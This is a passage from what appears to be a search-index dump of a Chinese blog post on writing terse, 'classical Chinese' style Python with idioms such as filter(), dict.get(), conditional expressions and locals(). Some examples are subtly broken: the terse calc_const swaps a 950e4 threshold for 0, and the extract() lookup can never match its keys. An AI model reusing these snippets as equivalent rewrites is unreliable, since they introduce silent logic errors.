calc_const ( score : int | float , rating : float ) -> float | None : const_pattern : list [ tuple [ bool , float | None ]] = [ ( rating == 0 , None ), # if rating == 0: const = None ( score >= 1000e4 , rating - 2 ), # elif score >= 1000e4: const = rating - 2 ( score >= 980e4 , rating - 1 - ( score - 980e4 ) / 20e4 ), ( score >= 0 , rating - ( score - 950e4 ) / 30e4 ), ( True , None ), # else: const = None ] return if_pattern ( const_pattern ) def if_pattern ( pattern : list [ tuple [ bool , _T ]]) -> _T : return filter ( lambda x : x [ 0 ], pattern ) . __next__ ()[ 1 ] \u4e4d\u4e00\u770b\uff0c\u6587\u8a00\u6587\u7248\u672c\u4f3c\u4e4e\u6bd4\u73b0\u4ee3\u6587\u7248\u672c\u66f4\u957f\u4e00\u4e9b\uff0c\u5176\u5b9e\u4e0d\u7136\uff0c\u5982\u679c\u6211\u4eec\u5c06 if_pattern () \u51fd\u6570\u5408\u5e76\u5230 calc_const () \u51fd\u6570\u4e2d\uff0c\u90a3\u4e48\u6587\u8a00\u6587\u7248\u672c\u5c31\u4f1a\u66f4\u77ed\u4e00\u4e9b\u3002\u5e76\u4e14\u7531\u4e8e\u5ef6\u957f\u4e00\u4e2a\u5224\u65ad\u9879\uff0c\u73b0\u4ee3\u6587\u7248\u672c\u9700\u8981\u589e\u52a0\u4e24\u884c\uff0c\u800c\u6587\u8a00\u6587\u7248\u672c\u53ea\u9700\u8981\u4e00\u884c\uff0c\u6240\u4ee5\u5f53\u5224\u65ad\u94fe\u5f88\u957f\u65f6\uff0c\u6587\u8a00\u6587\u7248\u672c\u4f1a\u66f4\u77ed\u4e00\u4e9b\u3002 \u8fd9\u4e2a\u6587\u8a00\u6587\u7248\u672c\u7684\u552f\u4e00\u7f3a\u70b9\u662f\uff0c\u5f53\u8fdb\u5165 calc_const () \u51fd\u6570\u65f6\uff0c\u9700\u8981\u8ba1\u7b97 const_pattern \u91cc\u6240\u6709\u5e03\u5c14\u8868\u8fbe\u5f0f\u7684\u503c\uff0c\u56e0\u6b64\u5728\u6027\u80fd\u4e0a\u53ef\u80fd\u4f1a\u7a0d\u7a0d\u900a\u8272\u4e8e\u73b0\u4ee3\u6587\u7248\u672c\u3002 2. \u4f7f\u7528 dict . get () \u65b9\u6cd5\u53d6\u4ee3 match-case \u6a21\u5f0f\u5339\u914d \u00b6 \u73b0\u4ee3\u6587\uff1a def return_relation_between_vn ( relation : str ) -> str : match relation : case 'seq' : return '\u3000\u7eed\u4f5c\u3000' case 'preq' : return '\u3000\u524d\u4f5c\u3000' case 'set' : return '\u540c\u4e00\u8bbe\u5b9a' case 'alt' : return '\u66ff\u4ee3\u7248\u672c' case 'char' : return '\u89d2\u8272\u5ba2\u4e32' case 'side' : return '\u652f\u7ebf\u6545\u4e8b' case 'par' : return '\u4e3b\u7ebf\u5267\u60c5' case 'ser' : return '\u540c\u4e00\u7cfb\u5217' case 'fan' : return 'FanDisc' case 'orig' : return '\u3000\u539f\u4f5c\u3000' case _ : return '\u672a\u77e5' \u6587\u8a00\u6587\uff1a def return_relation_between_vn ( relation : str ) -> str : return { 'seq' : '\u3000\u7eed\u4f5c\u3000' , # Sequel 'preq' : '\u3000\u524d\u4f5c\u3000' , # Prequel 'set' : '\u540c\u4e00\u8bbe\u5b9a' , # Same setting 'alt' : '\u66ff\u4ee3\u7248\u672c' , # Alternative version 'char' : '\u89d2\u8272\u5ba2\u4e32' , # Shares characters 'side' : '\u652f\u7ebf\u6545\u4e8b' , # Side story 'par' : '\u4e3b\u7ebf\u5267\u60c5' , # Parent story 'ser' : '\u540c\u4e00\u7cfb\u5217' , # Same series 'fan' : 'FanDisc' , # Fandisc 'orig' : '\u3000\u539f\u4f5c\u3000' , # Original game } . get ( relation , '\u672a\u77e5' ) \u7531\u4e8e PEP 8 \u4e0d\u5141\u8bb8\u6211\u4eec\u5c06\u591a\u4e2a\u58f0\u660e\u5199\u5728\u540c\u4e00\u884c\u4e0a\uff08 PEP 8: E701 multiple statements on one line (colon) \uff09\uff0c\u6545\u73b0\u4ee3\u6587\u7248\u672c\u5c06\u660e\u663e\u6bd4\u6587\u8a00\u6587\u7248\u672c\u5360\u636e\u66f4\u591a\u7684\u884c\u6570\u3002 \u5728 Python \u7248\u672c\u4f4e\u4e8e 3.10 \u7684\u60c5\u51b5\u4e0b\uff0c\u7531\u4e8e\u65e0\u6cd5\u4f7f\u7528 match-case \u6a21\u5f0f\u5339\u914d\uff08 PEP 634: Structural Pattern Matching \uff09\uff0c\u8fd9\u5c06\u5bfc\u81f4\u53ea\u80fd\u964d\u7ea7\u4f7f\u7528 if-elif-else \u5224\u65ad\u94fe\u8fdb\u884c\u94fe\u5f0f\u5224\u65ad\u3002 \u540c\u7406\uff0c\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528 dict . get () \u65b9\u6cd5\u6267\u884c\u4e00\u4e9b\u51fd\u6570\uff0c\u4f8b\u5982\uff1a def extract ( path : str ) -> None : return { '.zip' : pyzipper . ZipFile , '.7z' : py7zr . SevenZipFile , '.rar' : rarfile . RarFile , } . get ( path . split ( '.' )[ - 1 ], None ) . extractall ( path ) \u751a\u81f3\u4f7f\u7528 lambda \u8868\u8fbe\u5f0f\u4f5c\u4e3a\u51fd\u6570\uff1a Numeric = Union [ int , float , complex , np . number ] def calc ( a : Numeric , b : Numeric , op : str ) -> Optional [ Numeric ]: return { '+' : lambda : a + b , '-' : lambda : a - b , '*' : lambda : a * b , '/' : lambda : a / b , '%' : lambda : a % b , '**' : lambda : a ** b , '//' : lambda : a // b , } . get ( op , lambda : None )() 3. \u4f7f\u7528 ... \u65b9\u6cd5\u53d6\u4ee3 pass \u8bed\u53e5 \u00b6 \u73b0\u4ee3\u6587\uff1a try : a = 1 / 0 except ZeroDivisionError : pass \u6587\u8a00\u6587\uff1a try : a = 1 / 0 except ZeroDivisionError : ... \u9996\u5148\uff0c\u8fd9\u4e24\u6bb5\u4ee3\u7801\u7684\u6548\u679c\u662f\u4e00\u6a21\u4e00\u6837\u7684\u3002 \u90a3\u4e48\uff0c ... \u5230\u5e95\u662f\u4e2a\u4ec0\u4e48\u4e1c\u897f\u5462\uff1f\u53ef\u4ee5\u8bd5\u4e00\u8bd5 type ( ... ) \uff0c\u4f60\u4f1a\u53d1\u73b0\u5b83\u8fd4\u56de\u7684\u662f <class 'ellipsis'> \u3002\u8fd9\u4e2a\u4e1c\u897f\u7684\u5177\u4f53\u7528\u9014\u53ef\u4ee5\u89c1 Built-in Constants - Ellipsis \u6216 What does the Ellipsis object do? \u867d\u7136\u770b\u4e0a\u53bb\u6ca1\u6709\u4ec0\u4e48\u7528\uff0c\u4f46\u5176\u5b9e ... \u76f8\u5f53\u4e8e\u4e00\u4e2a\u8bed\u6c14\u8bcd\uff0c\u4e5f\u662f\u67d0\u952e\u76d8\u624b\u7684\u8457\u540d\u540d\u8a00\u3002\u4f60\u53ef\u4ee5\u5c06\u5176\u653e\u5230\u67d0\u4e9b\u7279\u5b9a\u7684 except \u8bed\u53e5\u5757\u4e2d\uff0c\u8868\u793a\u4f60\u5bf9\u629b\u51fa\u7684\u8fd9\u4e2a\u5f02\u5e38\u5341\u5206\u65e0\u8bed\u3002\u4f8b\u5982\uff1a try : result = await get_user_best35 ( user_id ) except ( socket . timeout , aiohttp . client_exceptions . ClientConnectionError , aiohttp . WSServerHandshakeError , ): ... 4. \u5c06 if-else \u5757\u6539\u4e3a if-else \u4e09\u76ee\u8fd0\u7b97\u7b26\uff08\u4f2a\uff09 \u00b6 \u73b0\u4ee3\u6587\uff1a if a > 0 : b = 1 else : b = - 1 \u6587\u8a00\u6587\uff1a b = 1 if a > 0 else - 1 \u8fd9\u4e2a\u5f88\u591a\u4eba\u5e94\u8be5\u90fd\u77e5\u9053\uff0c\u5c31\u4e0d\u8d58\u8ff0\u4e86\u3002 \u8fd9\u548c\u4e09\u76ee\u8fd0\u7b97\u7b26\u6709\u70b9\u76f8\u4f3c\uff1a b = a > 0 ? 1 : -1 5. \u5229\u7528 if-else \u4e09\u76ee\u8fd0\u7b97\u7b26\u5904\u7406\u5e8f\u5217 \u00b6 \u73b0\u4ee3\u6587\uff1a msg = 'the fox jumped over the lazy dog' new_msg = '' for char in msg : if char == ' ' : new_msg += ' ' else : # \u51ef\u6492\u5bc6\u7801 new_msg += chr (( ord ( char ) - ord ( 'a' ) + 1 ) % 26 + ord ( 'a' )) \u6587\u8a00\u6587\uff1a msg = 'the quick brown fox jumps over the lazy dog' new_msg = '' . join ( ' ' if char == ' ' else chr (( ord ( char ) - ord ( 'a' ) + 1 ) % 26 + ord ( 'a' )) for char in msg ) \u4e3a\u4e86\u53d9\u8ff0\u65b9\u4fbf\uff0c\u6211\u4eec\u628a\u6587\u8a00\u6587\u91cc\u51fa\u73b0\u7684 chr (( ord ( char ) - ord ( 'a' ) + 1 ) % 26 + ord ( 'a' )) \u8fd9\u4e2a\u8868\u8fbe\u5f0f\u79f0\u4e3a caesar(char) \uff0c\u5373\uff1a msg = 'the quick brown fox jumps over the lazy dog' new_msg = '' . join ( ' ' if char == ' ' else caesar ( char ) for char in msg ) \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u9700\u8981\u628a ' ' if char == ' ' else caesar ( char ) \u770b\u4f5c\u4e00\u4e2a\u6574\u4f53\uff0c\u800c\u4e0d\u662f\u628a caesar ( char ) for char in msg \u770b\u4f5c\u4e00\u4e2a\u6574\u4f53\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u8fd9\u4e2a\u590d\u6742\u7684\u8868\u8fbe\u5f0f\u6700\u7ec8\u662f\u4e00\u4e2a\u751f\u6210\u5668\uff08\u7531 for-in \u8bed\u53e5\u5236\u9020\uff09\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff08 if-else \u4e09\u76ee\u8fd0\u7b97\u7b26\uff09\u3002 \u53e6\u5916\uff0c\u4f60\u4e5f\u53ef\u4ee5\u5229\u7528 map () \u51fd\u6570\u548c lambda \u8868\u8fbe\u5f0f\u5199\u6210\u4ee5\u4e0b\u7684\u5f62\u5f0f\uff1a new_msg = '' . join ( map ( lambda char : ' ' if char == ' ' else caesar ( char ), msg )) 6. \u5229\u7528 inline \u5faa\u73af\u79fb\u9664\u5217\u8868\u4e2d\u7684\u91cd\u590d\u5143\u7d20 \u00b6 \u73b0\u4ee3\u6587\uff1a ls = [ 1 , 1 , 1 , 2 , 2 , 3 ] while 1 in ls : ls . remove ( 1 ) \u6587\u8a00\u6587\uff1a ls = [ 1 , 1 , 1 , 2 , 2 , 3 ] ls = [ item for item in ls if item != 1 ] \u6709\u6ca1\u6709\u611f\u5174\u8da3\u7684\u540c\u5b66\u6765\u4e00\u6ce2\u6027\u80fd\u5206\u6790\uff1f 7. \u4f7f\u7528 locals () \u53d6\u4ee3 API \u8bf7\u6c42\u53c2\u6570\u5217\u8868 \u00b6 \u73b0\u4ee3\u6587\uff1a async def user_best ( user , usercode , songname , songid , difficulty , withrecent , withsonginfo ) -> dict : user_best_params = dict ( user = user , usercode = usercode , songname = songname , songid = songid , difficulty = difficulty , withrecent = withrecent , withsonginfo = withsonginfo , ) return await _request ( Endpoint . V1 . User . best , user_best_params ) \u6587\u8a00\u6587\uff1a async def user_best ( user , usercode , songname , songid , difficulty , withrecent , withsonginfo ) -> dict : return await _request ( Endpoint . V1 . User . best , locals ()) \u8fd9\u6837\u7684\u597d\u5904\u4e0d\u8a00\u800c\u55bb\u2014\u2014\u4e0d\u7528\u6bcf\u6b21\u5199 API \u51fd\u6570\u90fd\u8981\u590d\u8bfb\u4e00\u904d\u53c2\u6570\u5217\u8868\u3002\u751a\u81f3\u975e\u5e38\u7b80\u6d01\u2014\u2014\u53ef\u4ee5\u4e00\u884c\u5199\u5b8c\u8fd9\u4e2a\u51fd\u6570\u3002 \u4f46\u662f\u7f3a\u70b9\u4e5f\u5f88\u660e\u663e\uff1a\u5728\u8c03\u7528 locals () \u51fd\u6570\u4e4b\u524d\uff0c\u8be5\u51fd\u6570\u5185\u90e8\u4e0d\u80fd\u5b9a\u4e49\u4efb\u4f55\u53d8\u91cf\uff0c\u5426\u5219\u8fd9\u4e2a\u65b0\u53d8\u91cf\u5c06\u52a0\u5165 API \u7684\u53c2\u6570\u5217\u8868\u3002 \u9898\u5916\u8bdd \u82e5\u8003\u8651\u4f20\u9012\u7ed9 API \u7684\u53c2\u6570\u53ef\u80fd\u4e3a None \u7684\u60c5\u51b5\uff0c\u90a3\u4e48\u5fc5\u987b\u5728 _request() \u51fd\u6570\u4e2d\u6e05\u7406\u8fd9\u4e9b None \uff0c\u5982\u4e0b\uff1a clear_params = { k : v for k , v in params . items () if v is not None } \u751a\u81f3\u53ef\u4ee5\u5c06\u5176\u5305\u88c5\u4e3a\u4e00\u4e2a\u5355\u72ec\u7684 set_params() \u51fd\u6570\uff1a def set_params ( ** kwargs ): return { k : v for k , v in kwargs . items () if v is not None } \u65e0\u8bba\u662f\u6587\u8a00\u6587\u7248\u672c\u8fd8\u662f\u73b0\u4ee3\u6587\u7248\u672c\uff0c\u8fd9\u90fd\u662f\u4e0d\u53ef\u907f\u514d\u7684\u3002","title":"\u5982\u4f55\u5c06 Python \u5199\u6210\u6587\u8a00\u6587"},{"location":"blog/2022/220511-how-to-write-python-into-classical-chinese/#_1","text":"\u4fd7\u8bdd\u8bf4\u5f97\u597d\uff1a \u201c\u7528 Python \u5199\u7a0b\u5e8f\u5c31\u50cf\u662f\u7528\u767d\u8bdd\u5199\u4f5c\u6587\u3002\u201d \u65e2\u7136\u5982\u6b64\uff0c\u4e3a\u4f55\u4e0d\u8bd5\u4e00\u8bd5\u5c06 Python \u5199\u6210\u6587\u8a00\u6587\u5462\uff1f\u5bf9\u4e8e\u4e00\u4e2a\u50cf Python \u8fd9\u6837\u5177\u6709\u4e30\u5bcc\u8bed\u6cd5\u7cd6\u7684\u89e3\u91ca\u578b\u8bed\u8a00\u6765\u8bf4\uff0c\u5c06\u5176\u5199\u6210\u6587\u8a00\u6587\u662f\u4e00\u4ef6\u975e\u5e38\u5bb9\u6613\u4e14\u6709\u8da3\u7684\u4e8b\u60c5\u3002\u4e5f\u6b63\u5982\u67d0\u4eba\u6240\u8bf4\uff1a \u201c\uff08\u6587\u5b66\u610f\u4e49\u4e0a\u7684\uff09\u6587\u8a00\u6587\u4f55\u5c1d\u4e0d\u5c31\u662f\u4e00\u4e2a\u8bed\u6cd5\u7cd6\u7684\u5408\u96c6\u5462\uff1f\u201d \u672c\u7bc7\u535a\u5ba2\u7684\u610f\u4e49\uff0c\u4fbf\u662f\u4ecb\u7ecd\u5982\u4f55\u5229\u7528\u5404\u79cd\u8bed\u6cd5\u7cd6\uff0c\u5c06 Python \u5199\u6210\u6587\u8a00\u6587\u3002\u5f53\u7136\uff0c\u5982\u679c\u4f60\u60f3\u5728\u751f\u4ea7\u73af\u5883\u4e2d\u7528\u8fd9\u79cd\u5199\u6cd5\u5199 Python \u7a0b\u5e8f\uff0c\u7406\u8bba\u4e0a\u4e5f\u4e0d\u662f\u4e0d\u884c\uff0c\u4f46\u662f\u4f60\u771f\u7684\u89c1\u8fc7\u6709\u4eba\u5728\u81ea\u5df1\u7684\u6587\u7ae0\u91cc\u5199\u4e00\u5927\u5806\u6587\u8a00\u6587\u5417\uff1f","title":"\u7eea\u8bba"},{"location":"blog/2022/220511-how-to-write-python-into-classical-chinese/#_2","text":"\u4e3a\u4e86\u66f4\u597d\u5730\u8fd0\u7528\u8bed\u6cd5\u7cd6\uff0c\u672c\u535a\u5ba2\u6d89\u53ca\u5230\u7684\u6240\u6709 Python \u7248\u672c\u5747\u4e3a Python 3.10\u3002","title":"\u5199\u6cd5\u793a\u8303"},{"location":"blog/2022/220511-how-to-write-python-into-classical-chinese/#1-filter-if-elif-else","text":"\u73b0\u4ee3\u6587\uff1a def calc_const ( score : int | float , rating : float ) -> float | None : if rating == 0 : const = None elif score >= 1000e4 : const = rating - 2 elif score >= 980e4 : const = rating - 1 - ( score - 980e4 ) / 20e4 elif score >= 950e4 : const = rating - ( score - 950e4 ) / 30e4 else : const = None return const \u6587\u8a00\u6587\uff1a def calc_const ( score : int | float , rating : float ) -> float | None : const_pattern : list [ tuple [ bool , float | None ]] = [ ( rating == 0 , None ), # if rating == 0: const = None ( score >= 1000e4 , rating - 2 ), # elif score >= 1000e4: const = rating - 2 ( score >= 980e4 , rating - 1 - ( score - 980e4 ) / 20e4 ), ( score >= 0 , rating - ( score - 950e4 ) / 30e4 ), ( True , None ), # else: const = None ] return if_pattern ( const_pattern ) def if_pattern ( pattern : list [ tuple [ bool , _T ]]) -> _T : return filter ( lambda x : x [ 0 ], pattern ) . __next__ ()[ 1 ] \u4e4d\u4e00\u770b\uff0c\u6587\u8a00\u6587\u7248\u672c\u4f3c\u4e4e\u6bd4\u73b0\u4ee3\u6587\u7248\u672c\u66f4\u957f\u4e00\u4e9b\uff0c\u5176\u5b9e\u4e0d\u7136\uff0c\u5982\u679c\u6211\u4eec\u5c06 if_pattern () \u51fd\u6570\u5408\u5e76\u5230 calc_const () \u51fd\u6570\u4e2d\uff0c\u90a3\u4e48\u6587\u8a00\u6587\u7248\u672c\u5c31\u4f1a\u66f4\u77ed\u4e00\u4e9b\u3002\u5e76\u4e14\u7531\u4e8e\u5ef6\u957f\u4e00\u4e2a\u5224\u65ad\u9879\uff0c\u73b0\u4ee3\u6587\u7248\u672c\u9700\u8981\u589e\u52a0\u4e24\u884c\uff0c\u800c\u6587\u8a00\u6587\u7248\u672c\u53ea\u9700\u8981\u4e00\u884c\uff0c\u6240\u4ee5\u5f53\u5224\u65ad\u94fe\u5f88\u957f\u65f6\uff0c\u6587\u8a00\u6587\u7248\u672c\u4f1a\u66f4\u77ed\u4e00\u4e9b\u3002 \u8fd9\u4e2a\u6587\u8a00\u6587\u7248\u672c\u7684\u552f\u4e00\u7f3a\u70b9\u662f\uff0c\u5f53\u8fdb\u5165 calc_const () \u51fd\u6570\u65f6\uff0c\u9700\u8981\u8ba1\u7b97 const_pattern \u91cc\u6240\u6709\u5e03\u5c14\u8868\u8fbe\u5f0f\u7684\u503c\uff0c\u56e0\u6b64\u5728\u6027\u80fd\u4e0a\u53ef\u80fd\u4f1a\u7a0d\u7a0d\u900a\u8272\u4e8e\u73b0\u4ee3\u6587\u7248\u672c\u3002","title":"1. \u4f7f\u7528 filter() \u51fd\u6570\u53d6\u4ee3 if-elif-else \u5224\u65ad\u94fe"},{"location":"blog/2022/220511-how-to-write-python-into-classical-chinese/#2-dictget-match-case","text":"\u73b0\u4ee3\u6587\uff1a def return_relation_between_vn ( relation : str ) -> str : match relation : case 'seq' : return '\u3000\u7eed\u4f5c\u3000' case 'preq' : return '\u3000\u524d\u4f5c\u3000' case 'set' : return '\u540c\u4e00\u8bbe\u5b9a' case 'alt' : return '\u66ff\u4ee3\u7248\u672c' case 'char' : return '\u89d2\u8272\u5ba2\u4e32' case 'side' : return '\u652f\u7ebf\u6545\u4e8b' case 'par' : return '\u4e3b\u7ebf\u5267\u60c5' case 'ser' : return '\u540c\u4e00\u7cfb\u5217' case 'fan' : return 'FanDisc' case 'orig' : return '\u3000\u539f\u4f5c\u3000' case _ : return '\u672a\u77e5' \u6587\u8a00\u6587\uff1a def return_relation_between_vn ( relation : str ) -> str : return { 'seq' : '\u3000\u7eed\u4f5c\u3000' , # Sequel 'preq' : '\u3000\u524d\u4f5c\u3000' , # Prequel 'set' : '\u540c\u4e00\u8bbe\u5b9a' , # Same setting 'alt' : '\u66ff\u4ee3\u7248\u672c' , # Alternative version 'char' : '\u89d2\u8272\u5ba2\u4e32' , # Shares characters 'side' : '\u652f\u7ebf\u6545\u4e8b' , # Side story 'par' : '\u4e3b\u7ebf\u5267\u60c5' , # Parent story 'ser' : '\u540c\u4e00\u7cfb\u5217' , # Same series 'fan' : 'FanDisc' , # Fandisc 'orig' : '\u3000\u539f\u4f5c\u3000' , # Original game } . get ( relation , '\u672a\u77e5' ) \u7531\u4e8e PEP 8 \u4e0d\u5141\u8bb8\u6211\u4eec\u5c06\u591a\u4e2a\u58f0\u660e\u5199\u5728\u540c\u4e00\u884c\u4e0a\uff08 PEP 8: E701 multiple statements on one line (colon) \uff09\uff0c\u6545\u73b0\u4ee3\u6587\u7248\u672c\u5c06\u660e\u663e\u6bd4\u6587\u8a00\u6587\u7248\u672c\u5360\u636e\u66f4\u591a\u7684\u884c\u6570\u3002 \u5728 Python \u7248\u672c\u4f4e\u4e8e 3.10 \u7684\u60c5\u51b5\u4e0b\uff0c\u7531\u4e8e\u65e0\u6cd5\u4f7f\u7528 match-case \u6a21\u5f0f\u5339\u914d\uff08 PEP 634: Structural Pattern Matching \uff09\uff0c\u8fd9\u5c06\u5bfc\u81f4\u53ea\u80fd\u964d\u7ea7\u4f7f\u7528 if-elif-else \u5224\u65ad\u94fe\u8fdb\u884c\u94fe\u5f0f\u5224\u65ad\u3002 \u540c\u7406\uff0c\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528 dict . get () \u65b9\u6cd5\u6267\u884c\u4e00\u4e9b\u51fd\u6570\uff0c\u4f8b\u5982\uff1a def extract ( path : str ) -> None : return { '.zip' : pyzipper . ZipFile , '.7z' : py7zr . SevenZipFile , '.rar' : rarfile . RarFile , } . get ( path . split ( '.' )[ - 1 ], None ) . extractall ( path ) \u751a\u81f3\u4f7f\u7528 lambda \u8868\u8fbe\u5f0f\u4f5c\u4e3a\u51fd\u6570\uff1a Numeric = Union [ int , float , complex , np . number ] def calc ( a : Numeric , b : Numeric , op : str ) -> Optional [ Numeric ]: return { '+' : lambda : a + b , '-' : lambda : a - b , '*' : lambda : a * b , '/' : lambda : a / b , '%' : lambda : a % b , '**' : lambda : a ** b , '//' : lambda : a // b , } . get ( op , lambda : None )()","title":"2. \u4f7f\u7528 dict.get() \u65b9\u6cd5\u53d6\u4ee3 match-case \u6a21\u5f0f\u5339\u914d"},{"location":"blog/2022/220511-how-to-write-python-into-classical-chinese/#3-pass","text":"\u73b0\u4ee3\u6587\uff1a try : a = 1 / 0 except ZeroDivisionError : pass \u6587\u8a00\u6587\uff1a try : a = 1 / 0 except ZeroDivisionError : ... \u9996\u5148\uff0c\u8fd9\u4e24\u6bb5\u4ee3\u7801\u7684\u6548\u679c\u662f\u4e00\u6a21\u4e00\u6837\u7684\u3002 \u90a3\u4e48\uff0c ... \u5230\u5e95\u662f\u4e2a\u4ec0\u4e48\u4e1c\u897f\u5462\uff1f\u53ef\u4ee5\u8bd5\u4e00\u8bd5 type ( ... ) \uff0c\u4f60\u4f1a\u53d1\u73b0\u5b83\u8fd4\u56de\u7684\u662f <class 'ellipsis'> \u3002\u8fd9\u4e2a\u4e1c\u897f\u7684\u5177\u4f53\u7528\u9014\u53ef\u4ee5\u89c1 Built-in Constants - Ellipsis \u6216 What does the Ellipsis object do? \u867d\u7136\u770b\u4e0a\u53bb\u6ca1\u6709\u4ec0\u4e48\u7528\uff0c\u4f46\u5176\u5b9e ... \u76f8\u5f53\u4e8e\u4e00\u4e2a\u8bed\u6c14\u8bcd\uff0c\u4e5f\u662f\u67d0\u952e\u76d8\u624b\u7684\u8457\u540d\u540d\u8a00\u3002\u4f60\u53ef\u4ee5\u5c06\u5176\u653e\u5230\u67d0\u4e9b\u7279\u5b9a\u7684 except \u8bed\u53e5\u5757\u4e2d\uff0c\u8868\u793a\u4f60\u5bf9\u629b\u51fa\u7684\u8fd9\u4e2a\u5f02\u5e38\u5341\u5206\u65e0\u8bed\u3002\u4f8b\u5982\uff1a try : result = await get_user_best35 ( user_id ) except ( socket . timeout , aiohttp . client_exceptions . ClientConnectionError , aiohttp . WSServerHandshakeError , ): ...","title":"3. \u4f7f\u7528 ... \u65b9\u6cd5\u53d6\u4ee3 pass \u8bed\u53e5"},{"location":"blog/2022/220511-how-to-write-python-into-classical-chinese/#4-if-else-if-else","text":"\u73b0\u4ee3\u6587\uff1a if a > 0 : b = 1 else : b = - 1 \u6587\u8a00\u6587\uff1a b = 1 if a > 0 else - 1 \u8fd9\u4e2a\u5f88\u591a\u4eba\u5e94\u8be5\u90fd\u77e5\u9053\uff0c\u5c31\u4e0d\u8d58\u8ff0\u4e86\u3002 \u8fd9\u548c\u4e09\u76ee\u8fd0\u7b97\u7b26\u6709\u70b9\u76f8\u4f3c\uff1a b = a > 0 ? 1 : -1","title":"4. \u5c06 if-else \u5757\u6539\u4e3a if-else \u4e09\u76ee\u8fd0\u7b97\u7b26\uff08\u4f2a\uff09"},{"location":"blog/2022/220511-how-to-write-python-into-classical-chinese/#5-if-else","text":"\u73b0\u4ee3\u6587\uff1a msg = 'the fox jumped over the lazy dog' new_msg = '' for char in msg : if char == ' ' : new_msg += ' ' else : # \u51ef\u6492\u5bc6\u7801 new_msg += chr (( ord ( char ) - ord ( 'a' ) + 1 ) % 26 + ord ( 'a' )) \u6587\u8a00\u6587\uff1a msg = 'the quick brown fox jumps over the lazy dog' new_msg = '' . join ( ' ' if char == ' ' else chr (( ord ( char ) - ord ( 'a' ) + 1 ) % 26 + ord ( 'a' )) for char in msg ) \u4e3a\u4e86\u53d9\u8ff0\u65b9\u4fbf\uff0c\u6211\u4eec\u628a\u6587\u8a00\u6587\u91cc\u51fa\u73b0\u7684 chr (( ord ( char ) - ord ( 'a' ) + 1 ) % 26 + ord ( 'a' )) \u8fd9\u4e2a\u8868\u8fbe\u5f0f\u79f0\u4e3a caesar(char) \uff0c\u5373\uff1a msg = 'the quick brown fox jumps over the lazy dog' new_msg = '' . join ( ' ' if char == ' ' else caesar ( char ) for char in msg ) \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u9700\u8981\u628a ' ' if char == ' ' else caesar ( char ) \u770b\u4f5c\u4e00\u4e2a\u6574\u4f53\uff0c\u800c\u4e0d\u662f\u628a caesar ( char ) for char in msg \u770b\u4f5c\u4e00\u4e2a\u6574\u4f53\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u8fd9\u4e2a\u590d\u6742\u7684\u8868\u8fbe\u5f0f\u6700\u7ec8\u662f\u4e00\u4e2a\u751f\u6210\u5668\uff08\u7531 for-in \u8bed\u53e5\u5236\u9020\uff09\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff08 if-else \u4e09\u76ee\u8fd0\u7b97\u7b26\uff09\u3002 \u53e6\u5916\uff0c\u4f60\u4e5f\u53ef\u4ee5\u5229\u7528 map () \u51fd\u6570\u548c lambda \u8868\u8fbe\u5f0f\u5199\u6210\u4ee5\u4e0b\u7684\u5f62\u5f0f\uff1a new_msg = '' . join ( map ( lambda char : ' ' if char == ' ' else caesar ( char ), msg ))","title":"5. \u5229\u7528 if-else \u4e09\u76ee\u8fd0\u7b97\u7b26\u5904\u7406\u5e8f\u5217"},{"location":"blog/2022/220511-how-to-write-python-into-classical-chinese/#6-inline","text":"\u73b0\u4ee3\u6587\uff1a ls = [ 1 , 1 , 1 , 2 , 2 , 3 ] while 1 in ls : ls . remove ( 1 ) \u6587\u8a00\u6587\uff1a ls = [ 1 , 1 , 1 , 2 , 2 , 3 ] ls = [ item for item in ls if item != 1 ] \u6709\u6ca1\u6709\u611f\u5174\u8da3\u7684\u540c\u5b66\u6765\u4e00\u6ce2\u6027\u80fd\u5206\u6790\uff1f","title":"6. \u5229\u7528 inline \u5faa\u73af\u79fb\u9664\u5217\u8868\u4e2d\u7684\u91cd\u590d\u5143\u7d20"},{"location":"blog/2022/220511-how-to-write-python-into-classical-chinese/#7-locals-api","text":"\u73b0\u4ee3\u6587\uff1a async def user_best ( user , usercode , songname , songid , difficulty , withrecent , withsonginfo ) -> dict : user_best_params = dict ( user = user , usercode = usercode , songname = songname , songid = songid , difficulty = difficulty , withrecent = withrecent , withsonginfo = withsonginfo , ) return await _request ( Endpoint . V1 . User . best , user_best_params ) \u6587\u8a00\u6587\uff1a async def user_best ( user , usercode , songname , songid , difficulty , withrecent , withsonginfo ) -> dict : return await _request ( Endpoint . V1 . User . best , locals ()) \u8fd9\u6837\u7684\u597d\u5904\u4e0d\u8a00\u800c\u55bb\u2014\u2014\u4e0d\u7528\u6bcf\u6b21\u5199 API \u51fd\u6570\u90fd\u8981\u590d\u8bfb\u4e00\u904d\u53c2\u6570\u5217\u8868\u3002\u751a\u81f3\u975e\u5e38\u7b80\u6d01\u2014\u2014\u53ef\u4ee5\u4e00\u884c\u5199\u5b8c\u8fd9\u4e2a\u51fd\u6570\u3002 \u4f46\u662f\u7f3a\u70b9\u4e5f\u5f88\u660e\u663e\uff1a\u5728\u8c03\u7528 locals () \u51fd\u6570\u4e4b\u524d\uff0c\u8be5\u51fd\u6570\u5185\u90e8\u4e0d\u80fd\u5b9a\u4e49\u4efb\u4f55\u53d8\u91cf\uff0c\u5426\u5219\u8fd9\u4e2a\u65b0\u53d8\u91cf\u5c06\u52a0\u5165 API \u7684\u53c2\u6570\u5217\u8868\u3002 \u9898\u5916\u8bdd \u82e5\u8003\u8651\u4f20\u9012\u7ed9 API \u7684\u53c2\u6570\u53ef\u80fd\u4e3a None \u7684\u60c5\u51b5\uff0c\u90a3\u4e48\u5fc5\u987b\u5728 _request() \u51fd\u6570\u4e2d\u6e05\u7406\u8fd9\u4e9b None \uff0c\u5982\u4e0b\uff1a clear_params = { k : v for k , v in params . items () if v is not None } \u751a\u81f3\u53ef\u4ee5\u5c06\u5176\u5305\u88c5\u4e3a\u4e00\u4e2a\u5355\u72ec\u7684 set_params() \u51fd\u6570\uff1a def set_params ( ** kwargs ): return { k : v for k , v in kwargs . items () if v is not None } 